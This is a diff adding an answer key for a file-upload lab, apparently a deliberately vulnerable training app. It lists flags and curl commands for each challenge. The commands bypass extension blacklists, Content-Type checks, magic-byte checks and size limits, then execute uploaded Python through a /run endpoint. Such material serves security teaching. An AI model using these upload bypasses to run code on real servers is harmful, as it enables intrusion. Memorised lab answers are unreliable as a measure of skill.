@@ -1,0 +1,84 @@
+===============================================================================
+  NeonGallery — File Upload Lab Solutions (Port 5010)
+===============================================================================
+
+CHALLENGE 1: No Validation — Unrestricted Upload
+Flag: FLAG{upl04d_unr3str1ct3d}
+
+  The /upload endpoint accepts any file without validation.
+  Upload a Python script and execute it via /run.
+
+  echo 'print(open("/app/flag.txt").read())' > /tmp/exploit.py
+
+  curl -F "file=@/tmp/exploit.py" http://localhost:5010/upload
+
+  curl "http://localhost:5010/run?file=exploit.py&ch=1"
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Extension Blacklist Bypass
+Flag: FLAG{upl04d_3xt_byp4ss}
+
+  The /upload-filtered endpoint blocks .py, .sh, .php, .jsp, .exe, .bat.
+  But the check is case-sensitive and doesn't block .py3, .Py, or .PY.
+
+  echo 'print(open("/app/flag2.txt").read())' > /tmp/exploit.py3
+
+  curl -F "file=@/tmp/exploit.py3" http://localhost:5010/upload-filtered
+
+  curl "http://localhost:5010/run?file=exploit.py3&ch=2"
+
+  Alternative: Use .Py or .PY extension (case variation bypass).
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Content-Type Bypass
+Flag: FLAG{upl04d_ct_byp4ss}
+
+  The /upload-ct endpoint checks that Content-Type starts with "image/".
+  But Content-Type is client-controlled — just set it in the request.
+
+  echo 'print(open("/app/flag3.txt").read())' > /tmp/exploit.py
+
+  curl -F "file=@/tmp/exploit.py;type=image/png" \
+    http://localhost:5010/upload-ct
+
+  curl "http://localhost:5010/run?file=exploit.py&ch=3"
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: Magic Bytes Bypass
+Flag: FLAG{upl04d_m4g1c_byt3s}
+
+  The /upload-magic endpoint checks the first 4 bytes for image magic
+  numbers (\x89PNG, \xff\xd8\xff\xe0 JPEG, GIF8).
+  Prepend magic bytes to a Python script.
+
+  python3 -c "
+  with open('/tmp/exploit_magic.py', 'wb') as f:
+      f.write(b'\x89PNG')
+      f.write(b'\nprint(open(\"/app/flag4.txt\").read())\n')
+  "
+
+  curl -F "file=@/tmp/exploit_magic.py" http://localhost:5010/upload-magic
+
+  curl "http://localhost:5010/run?file=exploit_magic.py&ch=4"
+
+  The /run endpoint strips leading non-ASCII bytes before exec().
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Size Limit Bypass
+Flag: FLAG{upl04d_s1z3_l1m1t}
+
+  The /upload-size endpoint rejects files larger than 100 bytes.
+  A minimal Python one-liner fits easily:
+
+  echo -n 'print(open("/app/flag5.txt").read())' > /tmp/tiny.py
+  # This is only ~37 bytes
+
+  curl -F "file=@/tmp/tiny.py" http://localhost:5010/upload-size
+
+  curl "http://localhost:5010/run?file=tiny.py&ch=5"
+
+===============================================================================
